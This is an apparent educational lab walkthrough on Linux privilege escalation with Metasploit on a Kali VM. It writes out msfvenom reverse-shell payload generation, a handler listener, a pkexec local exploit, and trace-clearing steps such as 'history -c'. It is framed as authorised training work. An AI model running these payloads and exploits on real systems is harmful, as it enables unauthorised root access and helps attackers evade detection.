# Exploiting a Privilege Escalation Vulnerability

**Estimated time:** ~40 minutes

## Overview

This lab simulates a post-exploitation attack scenario using a Kali Linux virtual machine. You act as an attacker who has obtained access to a limited user account and attempts to escalate privileges to root using Metasploit post-exploitation modules.

The exercises walk through payload generation, session handling, local exploit discovery, privilege escalation attempts, and verification.

> ⚠️ **Ethics & Safety Notice**
> Perform this lab **only** in an isolated, authorized lab environment. Do not attempt these techniques on systems you do not own or have explicit permission to test.

---

## Learning Objectives

By completing this lab, you will be able to:

* Explain where privilege escalation fits within the post-exploitation phase
* Generate and deliver a reverse shell payload using Metasploit
* Handle Meterpreter sessions
* Identify potential local privilege escalation vectors
* Attempt privilege escalation using local exploit modules
* Verify whether root access was obtained

---

## Exercise 1: Prepare the Target Environment

### Step 1: Verify Metasploit Installation

Open a terminal in your Kali Linux VM and run:

```
msfconsole --version
```

**Why this matters:**
Ensures Metasploit is installed and ready for use.

---

### Step 2: Create a Non-Privileged Victim User

Create a simulated victim account (use password `kali` if prompted):

```
sudo adduser victim --disabled-password --gecos ""
```

**Why this matters:**
Privilege escalation typically begins from a compromised non-root account.

---

## Exercise 2: Generate and Deliver a Payload

### Step 1: Generate a Reverse Shell Payload

Create a 64-bit Linux Meterpreter reverse shell:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell64.elf
chmod +x shell64.elf
```

**Why this matters:**
Simulates creating a backdoor payload for remote code execution.

---

### Step 2: Deliver the Payload to the Victim

Move the payload into the victim's home directory:

```
sudo cp shell64.elf /home/victim/
sudo chown victim:victim /home/victim/shell64.elf
```

**Why this matters:**
Allows execution of the payload under a realistic, low-privilege context.

---

## Exercise 3: Handle the Incoming Connection

### Step 1: Start Metasploit

Launch Metasploit and wait for the `msf6` prompt:

```
msfconsole
```

---

### Step 2: Configure the Handler

Set up a listener for the reverse shell:

```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

**Why this matters:**
Prepares Metasploit to receive and manage the incoming Meterpreter session.

---

## Exercise 4: Execute Payload and Manage Session

### Task A: Execute the Payload

In a new terminal, simulate the victim executing the payload:

```
sudo -u victim /home/victim/shell64.elf
```

**Why this matters:**
Represents the moment of payload execution on the target system.

---

### Task B: Background the Session

Once the session opens in Metasploit:

```
background
```

**Why this matters:**
Keeps the session active while allowing additional Metasploit actions.

---

## Exercise 5: Identify and Exploit a Local Vulnerability

### Task A: Suggest Local Exploits

Run the local exploit suggester module:

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**Why this matters:**
Identifies known privilege escalation exploits compatible with the system.

---

### Task B: Attempt Privilege Escalation

Run a suggested exploit (example: `pkexec`):

```
use exploit/linux/local/pkexec
set SESSION 1
run
```

**Why this matters:**
Attempts to exploit a known local vulnerability to gain elevated privileges.

> Note: On modern Kali systems, this exploit is usually patched and will fail safely.

---

## Exercise 6: Verify Privilege Escalation

### Step 1: Interact with the Session

List and interact with sessions:

```
sessions
sessions -i 1
```

---

### Step 2: Check Current Privileges

```
getuid
shell
id
```

**Expected Result:**

* Successful escalation: `uid=0(root)`
* Typical modern Kali result: `uid=1001(victim)`

**Why this matters:**
Confirms whether privilege escalation succeeded.

---

## Exercise 7: (Optional) Clean Up Traces

Simulate attacker cleanup steps:

```
exit
exit
sudo rm /home/victim/shell64.elf
sudo deluser --remove-home victim
history -c
```

**Why this matters:**
Demonstrates how attackers may remove artifacts to evade detection.

---

## Challenge Exercise: Alternative Privilege Escalation

Without using Metasploit, attempt to identify other escalation paths:

* Review `/etc/passwd`
* Check sudo permissions with `sudo -l`
* Search for world-writable or SUID binaries

**Goal:**
Identify at least one additional potential privilege escalation vector.

---

## Summary

In this lab, you:

* Generated a Meterpreter reverse shell payload
* Simulated a compromised low-privilege user
* Handled an incoming Metasploit session
* Identified potential local privilege escalation exploits
* Attempted privilege escalation
* Verified access level
* Practiced optional cleanup techniques
* Explored manual privilege escalation paths

This workflow mirrors real-world post-exploitation analysis while remaining safely contained in a lab environment.
